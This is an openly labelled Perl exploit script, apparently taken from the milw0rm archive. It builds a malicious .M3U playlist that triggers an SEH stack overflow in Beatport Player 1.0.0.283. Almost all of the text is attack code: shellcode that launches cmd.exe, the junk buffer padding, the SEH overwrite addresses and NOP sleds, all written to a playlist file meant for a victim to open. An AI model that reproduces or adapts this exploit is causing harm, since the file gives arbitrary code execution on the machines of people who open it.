 #!/usr/bin/perl
# Beatport Player 1.0.0.283 (.M3U File) Stack Core Overflow Exploit(SEH)
# Work Only in WIN SP2 FR
# Credit to SirGod The Discover
# Stack The exploiter
# Whalna rire m3a lprogram mati khdeme hta ti chiyeb lpc :d
# After exec the exploit wait some sec for see the cmd executed :d
use strict;
use warnings;
# win32_exec -  EXITFUNC=seh CMD=cmd Size=32 Encoder=Stack http://Sysworm.com =>> http://www.milw0rm.com/exploits/8078
my $shellcode =
"\x8B\xEC\x33\xFF\x57".
"\xC6\x45\xFC\x63\xC6\x45".
"\xFD\x6D\xC6\x45\xFE\x64".
"\xC6\x45\xF8\x01\x8D".
"\x45\xFC\x50\xB8\xC7\x93".
"\xBF\x77\xFF\xD0";
my $junk = "\x41" x 1232;
my $next_seh="\xeb\x06\x90\x90";
my $seh  = "\x44\x25\xD1\x72"; #
my $nops = "\x90" x 4;
my $nopsled = "\x90" x 20;
open(my $playlist, "> seh_exploit.m3u");
print $playlist
                    $junk.$next_seh.$seh.$nops.$shellcode.$nopsled.
                    "\r\n";
close $playlist;

# milw0rm.com [2009-05-01]
